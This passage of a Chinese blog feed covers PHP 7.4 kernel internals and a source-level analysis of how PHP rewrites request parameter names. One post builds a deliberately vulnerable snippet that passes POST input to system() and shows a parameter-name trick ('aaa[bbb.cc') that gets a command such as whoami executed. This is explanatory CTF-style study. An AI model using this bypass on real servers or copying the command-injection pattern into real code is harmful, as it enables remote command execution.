将错误日志记录到具体哪个文件中</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *doc_root;      <span class="comment">// php的“根目录”</span></span><br><span class="line">    <span class="type">char</span> *user_dir;      <span class="comment">// 告诉php使用/~username打开脚本时到哪个目录下去找</span></span><br><span class="line">    <span class="type">char</span> *include_path;  <span class="comment">// require()，include()，fopen_with_path()函数寻找文件的目录</span></span><br><span class="line">    <span class="type">char</span> *open_basedir;  <span class="comment">// 将php允许操作的所有文件都限制在此组目录列表下</span></span><br><span class="line">    <span class="type">char</span> *extension_dir; <span class="comment">// 存放扩展库（模块）的目录</span></span><br><span class="line">    <span class="type">char</span> *php_binary;</span><br><span class="line">    <span class="type">char</span> *sys_temp_dir;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *upload_tmp_dir;          <span class="comment">// 文件上传时存放文件的临时目录</span></span><br><span class="line">    zend_long upload_max_filesize; <span class="comment">// 允许上传的文件的最大大小</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *error_append_string;  <span class="comment">// 错误信息后输出的字符串</span></span><br><span class="line">    <span class="type">char</span> *error_prepend_string; <span class="comment">// 错误信息前输出的字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *auto_prepend_file; <span class="comment">// 指定在php文件解析之前自动解析的文件</span></span><br><span class="line">    <span class="type">char</span> *auto_append_file;  <span class="comment">// 指定在php文件解析之后自动解析的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *input_encoding;</span><br><span class="line">    <span class="type">char</span> *internal_encoding;</span><br><span class="line">    <span class="type">char</span> *output_encoding;</span><br><span class="line"></span><br><span class="line">    arg_separators arg_separator; <span class="comment">// php产生的URL中用来分隔参数的分隔符</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *variables_order; <span class="comment">// php注册Environment，GET，POST，Cookie，Server变量的顺序</span></span><br><span class="line"></span><br><span class="line">    HashTable rfc1867_protected_variables; <span class="comment">// RFC1867保护的变量名，在main/rfc1867.c文件中有用到此变量</span></span><br><span class="line"></span><br><span class="line">    <span class="type">short</span> connection_status;     <span class="comment">// 三个连接状态，分别为正常，中断，超时</span></span><br><span class="line">    zend_bool ignore_user_abort; <span class="comment">// 是否即使在用户中止请求后也坚持完成整个请求</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> header_is_being_sent; <span class="comment">// 是否正在发送头部信息</span></span><br><span class="line"></span><br><span class="line">    zend_llist tick_functions; <span class="comment">// 仅在main目录下的php_ticks.c文件中有用到</span></span><br><span class="line"></span><br><span class="line">    zval http_globals[<span class="number">6</span>]; <span class="comment">// 存放GET、POST、SERVER等信息</span></span><br><span class="line"></span><br><span class="line">    zend_bool expose_php; <span class="comment">// 是否展示php的信息</span></span><br><span class="line"></span><br><span class="line">    zend_bool register_argc_argv; <span class="comment">// 是否声明$argv和$argc全局变量（包含用GET方法的信息）</span></span><br><span class="line">    zend_bool auto_globals_jit;   <span class="comment">// 是否仅在用到$_SERVER和$_ENV变量时才创建全局变量（而不是在脚本一启动时就自动创建）</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *docref_root; <span class="comment">// 如果打开了html_errors指令，php将会在出错信息上显示超连接</span></span><br><span class="line">    <span class="type">char</span> *docref_ext;  <span class="comment">// 指定文件的扩展名</span></span><br><span class="line"></span><br><span class="line">    zend_bool html_errors; <span class="comment">// 是否在出错信息中使用HTML标记</span></span><br><span class="line">    zend_bool xmlrpc_errors;</span><br><span class="line"></span><br><span class="line">    zend_long xmlrpc_error_number;</span><br><span class="line"></span><br><span class="line">    zend_bool activated_auto_globals[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">    zend_bool modules_activated;             <span class="comment">// 是否已经激活模块</span></span><br><span class="line">    zend_bool file_uploads;                  <span class="comment">// 是否允许HTTP文件上传</span></span><br><span class="line">    zend_bool during_request_startup;        <span class="comment">// 是否在请求初始化过程中</span></span><br><span class="line">    zend_bool allow_url_fopen;               <span class="comment">// 是否允许打开远程文件</span></span><br><span class="line">    zend_bool always_populate_raw_post_data; <span class="comment">// 是否总是生成$HTTP_RAW_POST_DATA变量（原始POST数据）</span></span><br><span class="line">    zend_bool report_zend_debug;             <span class="comment">// 是否打开zend debug，仅在main/main.c文件中有使用</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> last_error_type;      <span class="comment">// 最后的错误类型</span></span><br><span class="line">    <span class="type">char</span> *last_error_message; <span class="comment">// 最后的错误信息</span></span><br><span class="line">    <span class="type">char</span> *last_error_file;    <span class="comment">// 最后的错误文件</span></span><br><span class="line">    <span class="type">int</span> last_error_lineno;    <span class="comment">// 最后的错误行</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *php_sys_temp_dir;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *disable_functions;     <span class="comment">// 接受一个用逗号分隔的函数名列表，以禁用特定的函数</span></span><br><span class="line">    <span class="type">char</span> *disable_classes;       <span class="comment">// 接受一个用逗号分隔的类名列表，以禁用特定的类</span></span><br><span class="line">    zend_bool allow_url_include; <span class="comment">// 是否允许include/require远程文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PHP_WIN32</span></span><br><span class="line">    zend_bool com_initialized;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    zend_long max_input_nesting_level; <span class="comment">// 最大的嵌套层数</span></span><br><span class="line">    zend_long max_input_vars;</span><br><span class="line">    zend_bool in_user_include;         <span class="comment">// 是否处于用户包含空间</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *user_ini_filename;      <span class="comment">// 用户的ini文件名</span></span><br><span class="line">    zend_long user_ini_cache_ttl; <span class="comment">// ini缓存过期限制</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *request_order; <span class="comment">// 优先级比variables_order高，在request变量生成时用到，可能是历史遗留问题</span></span><br><span class="line"></span><br><span class="line">    zend_bool mail_x_header; <span class="comment">// 仅在ext/standard/mail.c文件中使用</span></span><br><span class="line">    <span class="type">char</span> *mail_log;</span><br><span class="line"></span><br><span class="line">    zend_bool in_error_log;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PHP_WIN32</span></span><br><span class="line">    zend_bool windows_show_crt_warning;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    zend_long syslog_facility;</span><br><span class="line">    <span class="type">char</span> *syslog_ident;</span><br><span class="line">    zend_bool have_called_openlog;</span><br><span class="line">    zend_long syslog_filter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面的字段很大一部分是与php.ini文件中的配置项对应的。 php启动并读取php.ini文件时就会对这些字段进行赋值，用户空间的<code>ini_get()</code>及<code>ini_set()</code>函数操作的一些配置也在是对这个全局变量进行操作。</p>
<h1><span id="sapi接口">SAPI接口</span></h1><p>SAPI（Server Application Programming Interface）指的是php具体应用的编程接口。php脚本要执行有很多种方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。虽然通过Web服务器和命令行程序执行脚本看起来很不一样，实际上它们的工作流程是一样的，命令行参数传递给php解释器要执行的脚本，相当于通过url请求一个php页面。脚本执行完成后返回响应结果，只不过命令行的响应结果是显示在终端上。</p>
<h1><span id="php生命周期">php生命周期</span></h1><p>php在接收到 SAPI 命令时，首先初始化并启动它的内核子系统，在内核子系统的启动快结束时，php开始加载它的扩展代码并对扩展初始化，此时php将调用每个模块的初始化例程，即MINIT。</p>
<p><strong>Module init (MINIT):</strong></p>
<p>php解释器启动，加载相关模块，在此时调用相关模块的MINIT方法，仅被调用一次。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">php_MINIT_FUNCTION(myphpextension)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 注册常量或者类等初始化操作</span></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Request init (RINIT):</strong></p>
<p>在模块初始化完成后，php等待来自SAPI的请求，当接收到SAPI请求后，SAPI层将控制权交由php层，php初始化本次请求执行脚本所需的环境变量，函数列表等，并调用所有模块的RINIT函数，使得每个扩展有机会设定特定的环境变量，根据请求分配资源，或者执行其他任务。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">php_RINIT_FUNCTION(myphpextension)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 例如记录请求开始时间</span></span><br><span class="line">    <span class="comment">// 随后在请求结束的时候记录结束时间。这样我们就能够记录下处理请求所花费的时间了</span></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Request shutdown (RSHUTDOWN):</strong></p>
<p>请求结束，php就会自动清理程序，顺序调用各个模块的RSHUTDOWN函数以执行最后的清理工作（如将session变量存入磁盘），接着执行垃圾收集，有效地对之前的请求期间用到的每个变量执行unset()。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">php_RSHUTDOWN_FUNCTION(myphpextension)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 例如记录请求结束时间，并把相应的信息写入到日至文件中。</span></span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Module shutdown (MSHUTDOWN):</strong></p>
<p>当RSHUTDOWN完成后，php继续等待SAPI的其他文档请求或者是关闭信号。对于CGI和CLI等SAPI，没有“下一个请求”，所以SAPI立刻开始关闭。关闭期间，php再次遍历每个扩展，调用其模块关闭函数，并最终关闭自己的内核子系统。</p>
<h1><span id="外部链接">外部链接</span></h1><p>[1] <a href="https://github.com/php/php-src/tags">php-src-tags</a></p>
]]></content>
      <tags>
        <tag>php74-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>php74内核源码阅读——变量基本结构</title>
    <url>/2022/11/06/php74k2/</url>
    <content><![CDATA[<p>php变量内部实现分析</p>
<span id="more"></span>

<h1><span id="前置知识">前置知识</span></h1><p>php的所有变量类型（如数字、字符串、数组）都是用<code>zval</code>结构体来存储的，在Zend/zend_types.h头文件中可以看到定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span>     <span class="title">zval</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">    zend_value        value;            <span class="comment">/* value */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ZEND_ENDIAN_LOHI_3(</span><br><span class="line">                zend_uchar    type,         <span class="comment">/* active type */</span></span><br><span class="line">                zend_uchar    type_flags,</span><br><span class="line">                <span class="keyword">union</span> &#123;</span><br><span class="line">                    <span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">                &#125; u)</span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> type_info;</span><br><span class="line">    &#125; u1;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">        <span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">        <span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">        <span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">        <span class="type">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">        <span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">        <span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">        <span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">    &#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中<code>value</code>是真正保存数据的字段。其类型<code>zend_value</code>定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">    zend_long         lval;             <span class="comment">/* long value */</span></span><br><span class="line">    <span class="type">double</span>            dval;             <span class="comment">/* double value */</span></span><br><span class="line">    zend_refcounted  *counted;</span><br><span class="line">    zend_string      *str;</span><br><span class="line">    zend_array       *arr;</span><br><span class="line">    zend_object      *obj;</span><br><span class="line">    zend_resource    *res;</span><br><span class="line">    zend_reference   *ref;</span><br><span class="line">    zend_ast_ref     *ast;</span><br><span class="line">    zval             *zv;</span><br><span class="line">    <span class="type">void</span>             *ptr;</span><br><span class="line">    zend_class_entry *ce;</span><br><span class="line">    zend_function    *func;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">uint32_t</span> w1;</span><br><span class="line">        <span class="type">uint32_t</span> w2;</span><br><span class="line">    &#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure>

<p>正因为<code>zend_value</code>是个联合体（union），php才在zend引擎的基础上实现了弱类型。</p>
<blockquote>
<p>这里使用联合体而不是用结构体是出于空间利用率的考虑，因为一个变量同时只能属于一种类型。如果使用结构体的话将会不必要的浪费空间，而php中的所有逻辑都围绕变量来进行的，这样的话，内存浪费将是十分大的。这种做法成本小但收益非常大。</p>
</blockquote>
<p>可以看出，除long、double类型直接存储值外，其它类型都为指针，指向各自的结构。zend引擎根据<code>zval</code>结构体中的<code>type</code>字段来储存一个变量的真正类型，然后根据<code>type</code>来选择如何获取<code>value</code>的值。对应的不同类型定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* regular data types */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_UNDEF                    0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_NULL                     1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_FALSE                    2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_TRUE                     3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_LONG                     4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_DOUBLE                   5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_STRING                   6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ARRAY                    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_OBJECT                   8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_RESOURCE                 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_REFERENCE                10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* constant expressions */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_CONSTANT_AST             11</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* internal types */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_INDIRECT                 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_PTR                      14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ALIAS_PTR                15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IS_ERROR                   15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fake types used only for type hinting (Z_TYPE(zv) can not use them) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IS_BOOL                    16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_CALLABLE                 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ITERABLE                 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_VOID                     19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IS_NUMBER                  20</span></span><br></pre></td></tr></table></figure>

<p>例如对于整形数据，此时<code>zval.type = IS_LONG</code>，zend引擎就去取<code>zval.value.lval</code>。如果是双精度或float数据，此时<code>zval.type = IS_DOUBLE</code>，则会去取<code>zval.value</code>的<code>dval</code>。</p>
<p>借用这样的机制，php就实现了弱类型，因为对于zend引擎来说，它所面对的永远都是同一种类型，那就是<code>zval</code>。</p>
<p>下面列出一些常见php数据类型结构体进行分析。</p>
<h1><span id="字符串">字符串</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">    <span class="type">size_t</span>            len;</span><br><span class="line">    <span class="type">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>gc</strong>：变量的引用计数信息，用于内存管理（垃圾回收）</p>
<p><strong>h</strong>：字符串通过Time33算法计算的到的hash值，避免了在数组操作中hash值的重复计算。据说提高了php7百分之5的性能（</p>
<p><strong>len</strong>：字符串的长度。</p>
<p><strong>val</strong>：字符串的内容。<code>val[1]</code>并不表示只能存储1个字节，在字符串分配时实际上是操作了<code>malloc(sizeof(zend_string) + 字符串长度)</code>，也就是会多分配一些内存，而多出来的内存起始位置就是val，这样就可以将字符串直接存储到val，并通过val进行读取。</p>
<h1><span id="数组">数组</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_array</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ZEND_ENDIAN_LOHI_4(</span><br><span class="line">                zend_uchar    flags,</span><br><span class="line">                zend_uchar    _unused,</span><br><span class="line">                zend_uchar    nIteratorsCount,</span><br><span class="line">                zend_uchar    _unused2)</span><br><span class="line">        &#125; v;</span><br><span class="line">        <span class="type">uint32_t</span> flags;</span><br><span class="line">    &#125; u;</span><br><span class="line">    <span class="type">uint32_t</span>          nTableMask;</span><br><span class="line">    Bucket           *arData;</span><br><span class="line">    <span class="type">uint32_t</span>          nNumUsed;</span><br><span class="line">    <span class="type">uint32_t</span>          nNumOfElements;</span><br><span class="line">    <span class="type">uint32_t</span>          nTableSize;</span><br><span class="line">    <span class="type">uint32_t</span>          nInternalPointer;</span><br><span class="line">    zend_long         nNextFreeElement;</span><br><span class="line">    <span class="type">dtor_func_t</span>       pDestructor;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>nTableMask</strong>：计算Bucket索引时的掩码，它的值是<code>nTableSize</code>的负数。</p>
<p><strong>*arData</strong>：Bucket数组。php数组的每一个元素都保存在这里，默认指向第一个元素。其数据类型<code>Bucket</code>定义如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Bucket</span> &#123;</span></span><br><span class="line">    zval              val;</span><br><span class="line">    zend_ulong        h;                <span class="comment">/* hash value (or numeric index)   */</span></span><br><span class="line">    zend_string      *key;              <span class="comment">/* string key or NULL for numerics */</span></span><br><span class="line">&#125; Bucket;</span><br></pre></td></tr></table></figure>

<p><strong>nNumUsed</strong>：当前使用的Bucket数。</p>
<blockquote>
<p>但不都是有效的，因为有的Bucket虽然被unset了但是没有马上被删除，而是做了IS_UNDEF标记。</p>
</blockquote>
<p><strong>nNumOfElements</strong>：有效的Bucket数，这个与上面不同，这里记录的是真实有效的Bucket数量。</p>
<p><strong>nTableSize</strong>：数组的大小。</p>
<p><strong>nIternalPointer</strong>：当前的指针位置。</p>
<p><strong>nNextFreeElement</strong>：下一个索引的值，比如每次给数组新增数据时，该值就会加一。</p>
<p><strong>pDestructor</strong>：析构函数，在删除或覆盖某个元素时，调用该函数，可以对旧元素进行清理。</p>
<p><strong>u</strong>：这里的u主要起到辅助作用。</p>
<blockquote>
<p>比如flags用来设置散列表的一些属性是否持久化、是否已经初始化等。</p>
</blockquote>
<h1><span id="对象">对象</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="type">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">    zend_class_entry *ce;</span><br><span class="line">    <span class="type">const</span> zend_object_handlers *handlers;</span><br><span class="line">    HashTable        *properties;</span><br><span class="line">    zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>gc</strong>：引用计数。</p>
<p><strong>handle</strong>：一次请求期间对象的编号，每一个对象都有一个唯一的编号，与创建的先后顺序有关，主要是在垃圾回收的时候使用。</p>
<p><strong>ce</strong>：该对象所属的类。</p>
<p><strong>handlers</strong>：对象操作的处理函数，比如成员属性的读写、成员方法的获取、对象的销毁克隆等。</p>
<p><strong>properties</strong>：普通成员属性的哈希表，初始化对象时该值为NULL。</p>
<p><strong>properties_table</strong>：用来存储普通成员的属性值，对象对非静态成员属性的操作就是通过这个数组。</p>
<h1><span id="资源">资源</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_resource</span> &#123;</span></span><br><span class="line">    zend_refcounted_h gc;</span><br><span class="line">    <span class="type">int</span>               handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">    <span class="type">int</span>               type;</span><br><span class="line">    <span class="type">void</span>             *ptr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>资源指的是tcp连接、文件句柄等等类型，这种类型比较灵活，可以随意定义struct。后面再分析这种类型，这里先略过。</p>
<h1><span id="引用">引用</span></h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_reference</span> &#123;</span></span><br><span class="line">    zend_refcounted_h              gc;</span><br><span class="line">    zval                           val;</span><br><span class="line">    zend_property_info_source_list sources;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>引用是php中比较特殊的一种类型，它实际是指向另外一个php变量，对它的修改会直接改动实际指向的<code>zval</code>，可以简单的理解为C中的指针。在php中通过<code>&amp;</code>操作符产生一个引用变量，不管以前的类型是什么，<code>&amp;</code>首先会创建一个<code>zend_reference</code>结构，其内嵌了一个<code>zval</code>，这个zval的<code>value</code>指向原来zval的value（如果是布尔、整形、浮点则直接复制原来的值），然后将原zval的类型修改为<code>IS_REFERENCE</code>，原zval的value指向新创建的<code>zend_reference</code>结构。</p>
</blockquote>
]]></content>
      <tags>
        <tag>php74-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>php传参特殊字符替换特性源码简析</title>
    <url>/2022/10/31/php_carafeat/</url>
    <content><![CDATA[<p>上课时突然想起一个很久以前遇到过的php特性，估摸着也不算复杂，简单写个源码分析。环境是<code>php-7.4.27</code>。</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aaa_bbb.cc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aaa_bbb.cc&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先正常传参<code>whoami</code>，从空白的返回看来似乎并没有按照我们预想的那样执行系统命令。通过动态调试可以发现，传入的参数已不再带有<code>.</code>，而是被替换为了<code>_</code>。</p>
<p><img src="/images/20221031184604.png"></p>
<p>定位参数处理的C源码位置，发现在源代码main文件夹下的<code>php_variables.c</code>文件中对传入的参数进行了处理。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ensure that we don&#x27;t have spaces or dots in the variable name (not binary safe) */</span></span><br><span class="line"><span class="keyword">for</span> (p = var; *p; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">        *p=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*p == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        is_array = <span class="number">1</span>;</span><br><span class="line">        ip = p;</span><br><span class="line">        *p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码将传入参数名中的空格和<code>.</code>全部替换为<code>_</code>，和调试显示的结果一致。</p>
<p>注意后面紧跟着的判断语句，很明显这是在通过传入的参数名判断我们传入的参数是否是数组类型的数据。遇到参数名中的<code>[</code>后会直接break跳出匹配循环，这将有可能成为绕过的突破点。我们继续往下跟进代码执行流。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_array) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        ip++;</span><br><span class="line">        index_s = ip;</span><br><span class="line">        <span class="keyword">if</span> (*ip==<span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">            index_s = <span class="literal">NULL</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ip = <span class="built_in">strchr</span>(ip, <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!ip) &#123;</span><br><span class="line">                <span class="comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span></span><br><span class="line">                *(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时<code>is_array</code>被置<code>1</code>，进入<code>if</code>语句，分析这段代码可知参数名中的<code>[</code>将被替换为<code>_</code>，结合上一个代码块中的<code>break</code>，在这之后的<code>.</code>和空格也不会再进行解析替换了。</p>
<p>所以我们若输入<code>aaa[bbb.cc</code>，则参数名将被解析为<code>aaa_bbb.cc</code>，成功传入正确的参数。</p>
<p><img src="/images/20221031190650.png"></p>
<p>经过测试后<code>$_POST</code>传参同理。</p>
<blockquote>
<p>Note: 這個部分在php8已經不會發生了<sup>[1]</sup>，因為在<code>*(index_s - 1) = &#39;_&#39;;</code>會再檢查一次是否有不符合的字元:</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">*(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">/* PHP variables cannot contain <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> their names, so we replace the characters <span class="keyword">with</span> a <span class="string">&#x27;_&#x27;</span> */</span><br><span class="line"><span class="keyword">for</span> (p = index_s; *p; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (*p == <span class="string">&#x27; &#x27;</span> || *p == <span class="string">&#x27;.&#x27;</span> || *p == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        *p = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><del>（谁会在、写代码的时候、传这么奇怪的参数啊！）</del></p>
<p>[1] <a href="https://github.com/php/php-src/blob/33375e927c2cce8ca353d199a9d7275c60fb41e4/main/php_variables.c#L196-L201">php8参数名解析代码变动</a></p>
]]></content>
      <tags>
        <tag>php-feature</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议解析及适用场景总结</title>
    <url>/2021/12/21/php_wrappers/</url>
    <content><![CDATA[<p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p>
<span id="more"></span>

<p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p>
<p>希望自己以后不要再被这个考点麻住了的说</p>
<p><a href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫）</del></a></p>
<h1><span id="食材准备">食材准备</span></h1><p>所谓php伪协议，其实就是<a href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
<p>支持的种类分为十二种：</p>
<p>file:// — 访问本地文件系统</p>
<p>http:// – https:// — 访问 HTTP(s) 网址</p>
<p>ftp:// – ftps:// — 访问 FTP(s) URLs</p>
